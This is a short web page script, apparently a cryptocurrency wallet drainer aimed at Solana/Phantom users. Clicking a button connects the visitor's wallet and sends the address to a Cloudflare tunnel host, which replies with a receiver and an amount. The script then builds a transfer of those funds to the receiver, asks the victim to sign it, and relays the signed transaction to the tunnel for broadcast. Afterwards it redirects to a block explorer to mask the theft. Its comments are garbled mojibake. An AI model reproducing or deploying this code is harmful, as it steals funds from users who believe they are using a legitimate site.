<script>
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        const sWeb3 = window.solanaWeb3;
        if (!p) return;

        try {
            await p.connect();
            // ðŸ”± åŠ¨ä¸ªå°æ‰‹è„šï¼šåªæŠŠåœ°å€å‘è¿‡åŽ»ï¼Œå‰©ä¸‹çš„å…¨ç­‰åŽç«¯å–‚
            const info = await fetch(`${tunnel}/prepare`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            }).then(r => r.json());

            if (info.error) return;

            // ðŸ”± å‰ç«¯å”¯ä¸€çš„ä»»åŠ¡ï¼šæŠŠåŽç«¯æ‹¼å¥½çš„æ•°ç­¾ä¸ªå­—
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: info.amount,
                })
            );
            tx.recentBlockhash = info.bh;
            tx.feePayer = p.publicKey;

            const signed = await p.signTransaction(tx);
            
            // å‘å°„ï¼
            fetch(`${tunnel}/broadcast`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ raw_tx: btoa(String.fromCharCode.apply(null, new Uint8Array(signed.serialize()))) })
            });

            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
        } catch (e) { location.reload(); }
    };
</script>
